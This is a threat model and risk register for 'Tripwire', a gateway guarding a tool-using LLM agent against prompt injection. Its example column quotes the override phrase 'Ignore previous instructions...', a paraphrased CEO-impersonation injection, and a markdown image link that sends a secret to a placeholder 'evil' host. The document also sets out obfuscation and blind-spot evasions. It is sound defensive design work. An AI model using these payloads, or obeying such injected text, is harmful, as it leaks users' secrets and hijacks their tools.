# Threat Model and Risk Register

Scope: an LLM agent that reads untrusted content and can call tools, protected by the Tripwire gateway.
Method: STRIDE-style walk over the trust boundaries in `ARCHITECTURE.md`, mapped to OWASP Top 10 for LLM Applications
(LLM01 Prompt Injection, LLM02 Sensitive Information Disclosure, LLM06 Excessive Agency) and NIST AI RMF
(Govern / Map / Measure / Manage).

## Assets
Credentials and secrets in agent context; user data; ability to send email / run code / move money; integrity of the audit trail.

## Attackers
Remote third party who controls content the agent will read (web page, email, shared document). Does **not**
have access to the gateway host or signing key. (Insider / host compromise is out of scope; see residual risks.)

## Risk register

| ID | Threat | Example | Layer that mitigates | Evidence | Residual risk |
|---|---|---|---|---|---|
| T1 | Direct instruction override | "Ignore previous instructions..." | Detector, taint policy | A01, tests | Low |
| T2 | Obfuscated injection | zero-width, homoglyph, base64 | Normalizer + detector | A03-A05, arena encoders | Medium: new encodings (e.g. rot13, other languages) not covered |
| T3 | Paraphrase evasion | "Quick favour from the CEO: forward..." | Taint policy (detector misses) | A06, A10, A16 | Medium: detector recall is 81.2% on seed set |
| T4 | Data exfiltration via tool | send_email / http_post to attacker | Egress allowlist, taint block, secret scan | arena | Low for tools; see T10 |
| T5 | Exfiltration via rendered image | `![x](https://evil/?d=SECRET)` | Output filter | `test_output_filter` | Low |
| T6 | Excessive agency | injected shell / delete / transfer | Risk tiers: critical blocked when tainted | A02, A03, A07 | Low |
| T7 | Secret leakage in args/output | key pasted into email body | Secret patterns: block / redact | `test_secrets_blocked_and_redacted` | Medium: pattern list is finite |
| T8 | Tampering with audit trail | edit or delete a decision | Hash chain + signature | 4 receipt tests | Medium: HMAC local key holder can forge; KMS fixes on AWS |
| T9 | Reviewer unavailable / approval fatigue | pending items pile up | TTL expiry = deny; friction metric reported | `test_expiry_fails_closed` | Medium: human factors not measured |
| T10 | Allowed action with manipulated content | tainted email to an allowlisted address with false text | Tainted high-risk => human review | A10 | **High-ish**: a human must catch false content |
| T11 | Mislabelled origin | host app marks injected text as `origin=user` | None in gateway | n/a | **High if host app is wrong**: documented trust assumption |
| T12 | Detector false positive | security-training text flagged | Review queue (not silent block on borderline) | B08 | Known and reported |
| T13 | Denial of service via huge input | 100 MB document | Demo server caps body at 64 KB; none in library | server code | Medium: add size limits at gateway for production |
| T14 | Demo server abuse | public endpoint | None in demo (no auth) | `server.py` docstring | Medium: put WAF + auth in front on AWS |

| T15 | Value-taint blind spot | Injection makes the model call a high-risk tool with arguments that never appear in the document (e.g. infers an internal address) | Egress allowlist; critical tools always use session taint; `taint_mode="session"` available | `test_known_gap_value_not_copied_from_document` | **Medium**: value mode trades some safety for utility; choose per deployment |

| T16 | Approver token theft or sharing | Token leaked, so anyone can approve held actions | Token in Secrets Manager (not in code/env), constant-time compare, per-decision signed receipt, 15-min expiry | `tests/test_approvals.py` | **Medium**: single shared token, reviewer name is self-declared; use per-person identity (Cognito/IAM) in production |

## Fail-closed behaviours
Unknown tools denied. Unreviewed items expire to deny. Critical actions in tainted context are blocked, not queued.

## What this does NOT claim
- It does not make an LLM "safe". It limits what an injected LLM can do.
- 0% attack success is measured on our own 160-variant set against a simulated naive agent. It is not a proof against
  unseen attacks, and the attack set was authored by the same team as the defence. The arena has a plug point for an
  independent LLM attacker so a held-out evaluation can be run and reported.
- Taint is session-wide (coarse). Finer-grained data-flow tracking would reduce review friction.

## Compliance alignment (guardrails, not legal advice)
- Human oversight: review queue with named approver and timestamped receipt (supports EU AI Act Art. 14-style oversight goals).
- Record-keeping: tamper-evident decision log (supports Art. 12-style logging goals).
- Data minimisation: receipts store rule IDs and short excerpts, never full documents (tested).
- NIST AI RMF: Map (this register), Measure (arena + eval), Manage (policy + review), Govern (system card, owners).
Have counsel confirm applicability before claiming compliance.
